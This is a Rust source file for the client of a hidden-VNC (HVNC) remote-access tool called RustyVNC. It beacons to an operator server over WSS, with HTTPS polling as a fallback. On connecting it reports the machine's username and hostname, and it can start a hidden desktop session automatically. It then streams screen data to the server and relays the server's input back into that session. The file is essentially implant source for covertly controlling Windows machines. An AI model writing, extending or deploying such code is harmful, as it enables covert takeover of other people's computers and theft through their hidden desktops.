mod hvnc;
mod socks;

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{bail, Context, Result};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
use clap::Parser;
use futures_util::{SinkExt, StreamExt};
use hvnc::HvncSession;
use reqwest::Url;
use serde::{Deserialize, Serialize};
use socks::{SocksOut, WakeSignal};
use tokio::time;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;
use uuid::Uuid;

static DEBUG: AtomicBool = AtomicBool::new(false);

#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        if $crate::debug_enabled() {
            eprintln!($($arg)*);
        }
    };
}

pub fn debug_enabled() -> bool {
    DEBUG.load(Ordering::Relaxed)
}

#[derive(Parser, Debug)]
#[command(author, version, about = "RustyVNC client")]
struct Args {
    #[arg(long, default_value = "https://127.0.0.1:7070")]
    server: String,

    #[arg(long)]
    token: Option<String>,

    #[arg(long)]
    client_id: Option<Uuid>,

    #[arg(long)]
    autostart: bool,

    #[arg(long, default_value_t = 70)]
    quality: u8,

    #[arg(long)]
    accept_invalid_certs: bool,

    #[arg(long)]
    debug: bool,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum ServerCommand {
    Start { quality: Option<u8> },
    Stop,
    Ping,
}

#[derive(Debug, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum ClientEvent<'a> {
    Hello {
        client_id: Uuid,
        platform: &'a str,
        user: &'a str,
        host: &'a str,
    },
    Started {
        client_id: Uuid,
        conn_id: Uuid,
    },
    Stopped {
        client_id: Uuid,
    },
    Error {
        client_id: Uuid,
        message: String,
    },
    Pong {
        client_id: Uuid,
    },
}

#[derive(Debug, Clone)]
enum WireMessage {
    Text(String),
    Binary(Vec<u8>),
}

#[derive(Debug, Serialize)]
struct HttpsPollRequest {
    events: Vec<HttpsEnvelope>,
    wait: bool,
}

#[derive(Debug, Deserialize)]
struct HttpsPollResponse {
    #[serde(default)]
    commands: Vec<HttpsEnvelope>,
}

#[derive(Debug, Serialize, Deserialize)]
struct HttpsEnvelope {
    kind: String,
    data: String,
}

struct Endpoints {
    display: String,
    wss_client: String,
    https_poll: Url,
}

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();
    DEBUG.store(args.debug, Ordering::Relaxed);
    ensure_windows_client()?;

    let client_id = args.client_id.unwrap_or_else(Uuid::new_v4);
    let endpoints = build_endpoints(&args.server, client_id, args.token.as_deref())?;

    let user = env_value("USERNAME")
        .or_else(|| env_value("USER"))
        .unwrap_or_default();
    let host = env_value("COMPUTERNAME")
        .or_else(|| env_value("HOSTNAME"))
        .unwrap_or_default();

    eprintln!("[*] RustyVNC client {}", client_id);
    eprintln!("[*] Server: {}", endpoints.display);
    eprintln!("[*] Transport: WSS preferred, HTTPS polling fallback");

    match run_websocket(&endpoints.wss_client, &args, client_id, &user, &host).await {
        Ok(()) => Ok(()),
        Err(err) => {
            eprintln!("[!] WSS unavailable: {err:#}");
            eprintln!(
                "[*] Falling back to HTTPS polling: {}",
                endpoints.https_poll
            );
            run_https_poll(&endpoints.https_poll, &args, client_id, &user, &host).await
        }
    }
}

async fn run_websocket(
    server: &str,
    args: &Args,
    client_id: Uuid,
    user: &str,
    host: &str,
) -> Result<()> {
    let (ws, _) = connect_async(server)
        .await
        .with_context(|| format!("connect wss endpoint {}", server))?;
    let (mut writer, mut reader) = ws.split();

    writer
        .send(hello_message(client_id, user, host)?.into_ws())
        .await?;

    let outbound: Arc<Mutex<Vec<SocksOut>>> = Arc::new(Mutex::new(Vec::new()));
    let wake = WakeSignal::new().context("create wake signal")?;
    let mut hvnc: Option<HvncSession> = None;
    let mut drain = time::interval(Duration::from_millis(20));

    if args.autostart {
        for message in start_hvnc_messages(
            &mut hvnc,
            outbound.clone(),
            wake.clone_ref(),
            client_id,
            args.quality,
        )? {
            writer.send(message.into_ws()).await?;
        }
    }

    loop {
        tokio::select! {
            _ = drain.tick() => {
                for message in drain_hvnc_messages(&outbound, client_id)? {
                    writer.send(message.into_ws()).await?;
                }
            }
            incoming = reader.next() => {
                let Some(incoming) = incoming else {
                    break;
                };
                match incoming? {
                    Message::Text(text) => {
                        for message in handle_server_text(
                            &text,
                            &mut hvnc,
                            outbound.clone(),
                            wake.clone_ref(),
                            client_id,
                            args.quality,
                        )? {
                            writer.send(message.into_ws()).await?;
                        }
                    }
                    Message::Binary(data) => handle_server_binary(hvnc.as_ref(), &data),
                    Message::Close(_) => break,
                    _ => {}
                }
            }
        }
    }

    if let Some(session) = hvnc.take() {
        session.stop();
    }

    bail!("websocket session closed")
}

async fn run_https_poll(
    poll_url: &Url,
    args: &Args,
    client_id: Uuid,
    user: &str,
    host: &str,
) -> Result<()> {
    let http = reqwest::Client::builder()
        .danger_accept_invalid_certs(args.accept_invalid_certs)
        .timeout(Duration::from_secs(35))
        .build()
        .context("build https client")?;

    let outbound: Arc<Mutex<Vec<SocksOut>>> = Arc::new(Mutex::new(Vec::new()));
    let wake = WakeSignal::new().context("create wake signal")?;
    let mut hvnc: Option<HvncSession> = None;
    let mut pending = vec![hello_message(client_id, user, host)?];

    if args.autostart {
        pending.extend(start_hvnc_messages(
            &mut hvnc,
            outbound.clone(),
            wake.clone_ref(),
            client_id,
            args.quality,
        )?);
    }

    loop {
        pending.extend(drain_hvnc_messages(&outbound, client_id)?);
        let wait = hvnc.is_none() && pending.is_empty();
        let request = HttpsPollRequest {
            events: pending
                .iter()
                .map(WireMessage::to_https_envelope)
                .collect::<Result<Vec<_>>>()?,
            wait,
        };
        pending.clear();

        let mut builder = http.post(poll_url.clone()).json(&request);
        if let Some(token) = args.token.as_deref() {
            builder = builder.bearer_auth(token);
        }

        let response = builder
            .send()
            .await
            .with_context(|| format!("https poll {}", poll_url))?;
        let status = response.status();
        if !status.is_success() {
            let body = response.text().await.unwrap_or_default();
            bail!("https poll returned {status}: {body}");
        }
        let poll = response
            .json::<HttpsPollResponse>()
            .await
            .context("decode https poll response")?;

        for envelope in poll.commands {
            match envelope.into_wire()? {
                WireMessage::Text(text) => pending.extend(handle_server_text(
                    &text,
                    &mut hvnc,
                    outbound.clone(),
                    wake.clone_ref(),
                    client_id,
                    args.quality,
                )?),
                WireMessage::Binary(data) => handle_server_binary(hvnc.as_ref(), &data),
            }
        }

        if !wait {
            time::sleep(Duration::from_millis(20)).await;
        }
    }
}

fn handle_server_text(
    text: &str,
    hvnc: &mut Option<HvncSession>,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    client_id: Uuid,
    default_quality: u8,
) -> Result<Vec<WireMessage>> {
    match serde_json::from_str::<ServerCommand>(text) {
        Ok(ServerCommand::Start { quality }) => start_hvnc_messages(
            hvnc,
            outbound,
            wake,
            client_id,
            quality.unwrap_or(default_quality),
        ),
        Ok(ServerCommand::Stop) => {
            if let Some(session) = hvnc.take() {
                session.stop();
            }
            Ok(vec![client_event_message(&ClientEvent::Stopped {
                client_id,
            })?])
        }
        Ok(ServerCommand::Ping) => Ok(vec![client_event_message(&ClientEvent::Pong {
            client_id,
        })?]),
        Err(err) => Ok(vec![client_event_message(&ClientEvent::Error {
            client_id,
            message: format!("invalid command: {}", err),
        })?]),
    }
}

fn handle_server_binary(hvnc: Option<&HvncSession>, data: &[u8]) {
    if let Some(session) = hvnc {
        session.handle_input(data);
    }
}

fn start_hvnc_messages(
    current: &mut Option<HvncSession>,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    client_id: Uuid,
    quality: u8,
) -> Result<Vec<WireMessage>> {
    match start_hvnc(current, outbound, wake, client_id, quality) {
        Ok(conn_id) => Ok(vec![client_event_message(&ClientEvent::Started {
            client_id,
            conn_id,
        })?]),
        Err(message) => Ok(vec![client_event_message(&ClientEvent::Error {
            client_id,
            message,
        })?]),
    }
}

fn start_hvnc(
    current: &mut Option<HvncSession>,
    outbound: Arc<Mutex<Vec<SocksOut>>>,
    wake: WakeSignal,
    client_id: Uuid,
    quality: u8,
) -> std::result::Result<Uuid, String> {
    if current.is_some() {
        return Err("HVNC already active".to_string());
    }
    let session = HvncSession::start(outbound, wake, client_id, quality)?;
    let conn_id = session.conn_id();
    *current = Some(session);
    Ok(conn_id)
}

fn drain_hvnc_messages(
    outbound: &Arc<Mutex<Vec<SocksOut>>>,
    client_id: Uuid,
) -> Result<Vec<WireMessage>> {
    let mut messages = Vec::new();
    for item in drain_outbound(outbound) {
        let _ = (
            &item.conn_id,
            &item.agent_id,
            item.index,
            &item.job_id,
            &item.token,
        );
        if item.close {
            messages.push(client_event_message(&ClientEvent::Stopped { client_id })?);
        } else if !item.data.is_empty() {
            messages.push(WireMessage::Binary(item.data));
        }
    }
    Ok(messages)
}

fn drain_outbound(outbound: &Arc<Mutex<Vec<SocksOut>>>) -> Vec<SocksOut> {
    match outbound.lock() {
        Ok(mut queue) => queue.drain(..).collect(),
        Err(_) => Vec::new(),
    }
}

fn hello_message(client_id: Uuid, user: &str, host: &str) -> Result<WireMessage> {
    client_event_message(&ClientEvent::Hello {
        client_id,
        platform: std::env::consts::OS,
        user,
        host,
    })
}

fn client_event_message(event: &ClientEvent<'_>) -> Result<WireMessage> {
    Ok(WireMessage::Text(serde_json::to_string(event)?))
}

impl WireMessage {
    fn into_ws(self) -> Message {
        match self {
            WireMessage::Text(text) => Message::Text(text),
            WireMessage::Binary(data) => Message::Binary(data),
        }
    }

    fn to_https_envelope(&self) -> Result<HttpsEnvelope> {
        match self {
            WireMessage::Text(text) => Ok(HttpsEnvelope {
                kind: "text".to_string(),
                data: text.clone(),
            }),
            WireMessage::Binary(data) => Ok(HttpsEnvelope {
                kind: "binary".to_string(),
                data: BASE64.encode(data),
            }),
        }
    }
}

impl HttpsEnvelope {
    fn into_wire(self) -> Result<WireMessage> {
        match self.kind.as_str() {
            "text" => Ok(WireMessage::Text(self.data)),
            "binary" => Ok(WireMessage::Binary(
                BASE64.decode(self.data).context("decode binary envelope")?,
            )),
            other => bail!("unknown https envelope kind: {}", other),
        }
    }
}

fn build_endpoints(base: &str, client_id: Uuid, token: Option<&str>) -> Result<Endpoints> {
    let parsed = Url::parse(base).with_context(|| format!("parse server URL {}", base))?;
    match parsed.scheme() {
        "https" => {
            let wss_client = endpoint_from_base(&parsed, "wss", "/ws/client")?;
            let https_poll = endpoint_from_base(&parsed, "https", "/api/client/poll")?;
            Ok(Endpoints {
                display: display_url(&parsed),
                wss_client: append_client_query(wss_client, client_id, token),
                https_poll: append_id_query(https_poll, client_id),
            })
        }
        "wss" => {
            let prefix = wss_prefix(parsed.path());
            let mut wss_client = parsed.clone();
            if wss_client.path() == "/" {
                wss_client.set_path("/ws/client");
            }
            let https_poll = endpoint_from_prefix(&parsed, "https", &prefix, "/api/client/poll")?;
            Ok(Endpoints {
                display: display_url(&parsed),
                wss_client: append_client_query(wss_client, client_id, token),
                https_poll: append_id_query(https_poll, client_id),
            })
        }
        "http" | "ws" => bail!("cleartext transport is not supported; use https:// or wss://"),
        other => bail!("unsupported server URL scheme: {}", other),
    }
}

fn endpoint_from_base(base: &Url, scheme: &str, endpoint: &str) -> Result<Url> {
    let prefix = base.path().trim_end_matches('/');
    endpoint_from_prefix(base, scheme, prefix, endpoint)
}

fn endpoint_from_prefix(base: &Url, scheme: &str, prefix: &str, endpoint: &str) -> Result<Url> {
    let mut url = base.clone();
    url.set_scheme(scheme)
        .map_err(|_| anyhow::anyhow!("unsupported URL scheme: {}", scheme))?;
    let prefix = prefix.trim_end_matches('/');
    if prefix.is_empty() {
        url.set_path(endpoint);
    } else {
        url.set_path(&format!("{}{}", prefix, endpoint));
    }
    url.set_query(None);
    Ok(url)
}

fn append_client_query(mut url: Url, client_id: Uuid, token: Option<&str>) -> String {
    {
        let mut pairs = url.query_pairs_mut();
        pairs.append_pair("id", &client_id.to_string());
        if let Some(token) = token {
            pairs.append_pair("token", token);
        }
    }
    url.to_string()
}

fn append_id_query(mut url: Url, client_id: Uuid) -> Url {
    {
        let mut pairs = url.query_pairs_mut();
        pairs.append_pair("id", &client_id.to_string());
    }
    url
}

fn wss_prefix(path: &str) -> String {
    path.strip_suffix("/ws/client")
        .unwrap_or(path)
        .trim_end_matches('/')
        .to_string()
}

fn display_url(url: &Url) -> String {
    let mut display = url.clone();
    display.set_query(None);
    display.to_string()
}

fn env_value(key: &str) -> Option<String> {
    std::env::var(key).ok().filter(|value| !value.is_empty())
}

#[cfg(windows)]
fn ensure_windows_client() -> Result<()> {
    Ok(())
}

#[cfg(not(windows))]
fn ensure_windows_client() -> Result<()> {
    bail!("rustyvnc-client is Windows-only; build the Windows target and run it from a logged-on Windows desktop session")
}
